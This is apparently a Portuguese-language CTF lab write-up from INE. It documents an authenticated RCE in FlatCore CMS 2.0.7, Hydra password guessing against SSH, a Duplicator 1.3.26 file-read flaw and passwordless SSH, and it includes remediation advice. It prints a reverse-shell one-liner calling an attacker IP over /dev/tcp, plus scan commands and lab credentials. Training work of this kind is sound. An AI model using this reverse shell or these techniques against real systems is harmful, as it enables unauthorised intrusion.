
# Report — Máquina: **Exploitation CTF 1** — `target1.ine.local` + `target2.ine.local`

- **Fonte:** INE Lab
    
- **Data:** `2025-11-17`
    
- **Autor:** Enrico Moreno
    
- **Nível:** medium
    
- **Tempo gasto:** ~1h
    

---

## 1) Executive summary

Foi identificado um CMS FlatCore vulnerável em `target1.ine.local`, explorado por RCE autenticado para captura da **Flag 1**.  
Também foi comprometido o usuário fraco do sistema via Hydra para captura da **Flag 2**.  
Em `target2.ine.local`, um plugin WordPress vulnerável (Duplicator 1.3.26) permitiu leitura arbitrária de arquivos e acesso SSH sem senha, possibilitando captura das **Flags 3 e 4**.

---

## 2) Escopo e limitações

- **Alvos testados:**
    
    - `http://target1.ine.local/`
        
    - `http://target2.ine.local/`
        
- **Ferramentas autorizadas:** Nmap, Hydra, Dirb, Python3, Metasploit
    
- **Limitações:** sem brute force improdutivo; uso estrito das wordlists sugeridas
    

---

## 3) Metodologia aplicada

- Recon: Nmap
    
- Enumeração: enum de serviços, plugins WordPress
    
- Análise: pesquisa de CVE e PoC
    
- Exploração: RCE + leaks + creds SSH
    
- Pós-exploração: privesc básico e coleta de flags
    
- Reporting: documentação completa
    

---

## 4) Achado 1 — RCE autenticada (FlatCore 2.0.7)

**Vulnerabilidade:** Remote Code Execution (CVE público)  
**Local / Endpoint:** `CMS Admin Panel (autenticado)`  
**Credenciais:** `admin:password1`  
**Flag / Artefato:** Flag 1 (hash MD5)

---

## 5) Evidências / PoC (resumo)

**Exploit utilizado (searchsploit):**  
`FlatCore CMS 2.0.7 - Remote Code Execution (Authenticated)`

**Reverse Shell utilizado:**

`bash -c "bash -i >& /dev/tcp/192.174.11.2/4444 0>&1"`

**Acesso obtido:** usuário `www-data` → leitura do `/root/` → **Flag 1**

---

## 6) Impacto & Severidade

**Severidade:** Alta  
**Justificativa:** Permitiu execução arbitrária de comandos no servidor com acesso a dados sensíveis e risco completo ao ambiente.

---

## 7) Reproduzir (passo-a-passo reprodutível)

1. Scan de serviços
    
    `nmap -sS -Pn -p- -sV target1.ine.local`
    
2. Login no CMS: `admin:password1`
    
3. Execução do exploit RCE autenticado
    
4. Reverse shell e leitura da Flag 1
    

---

## 8) Recomendações (rápidas)

- Atualizar CMS para versão corrigida
    
- Restringir painel por IP e MFA
    
- Monitorar logs e resets de senha
    

---

## 9) Recomendações técnicas

- Desabilitar upload de scripts e validação de MIME/caminhos
    
- Remover permissões excessivas do `www-data`
    
- Implementar regras AppArmor para isolamento da aplicação
    

---

## 10) Apêndice Técnico

### Nmap (Target1)

`PORT   STATE SERVICE VERSION 22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 80/tcp open  http    Apache 2.4.41 (Ubuntu)`

### Informações do CMS

- FlatCore **2.0.7**
    
- Backend: PHP 7.4 + SQLite
    
- Domínio: `target1.ine.local`
    
![](2025-11-17_14-55.png)
---

## 11) Lições aprendidas

- Exploração de RCE autenticada exige boas credenciais iniciais
    
- Enumeração de usuários fracos continua sendo vetor efetivo
    
- Manter CMS atualizado elimina vetores triviais
    

---

---

# Achado 2 — Credenciais fracas via Hydra (Target1)

**Usuário:** `iamaweakuser`  
**Wordlist:** `/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt`  
**Senha encontrada:** `angel`  
**Acesso:** SSH → **Flag 2**

**Severidade:** Alta (comprometimento direto da máquina)

---

---

# Achado 3 — Arbitrary File Read (Duplicator 1.3.26) — Target2

**Vulnerabilidade:** File Read sem autenticação  
**Plugin:** Duplicator 1.3.26  
**Ferramenta:** Metasploit module `50420.py` (equivalente MSF)

→ **Flag 3** obtida no `/root/flag3.txt`

---

---

# Achado 4 — SSH sem senha (Target2)

**Usuário identificado via /etc/passwd leak:** `iamacrazyfreeuser`  
**Acesso:** SSH sem senha  
→ **Flag 4** obtida no `/root/`

**Severidade:** Crítica (controle total do host)
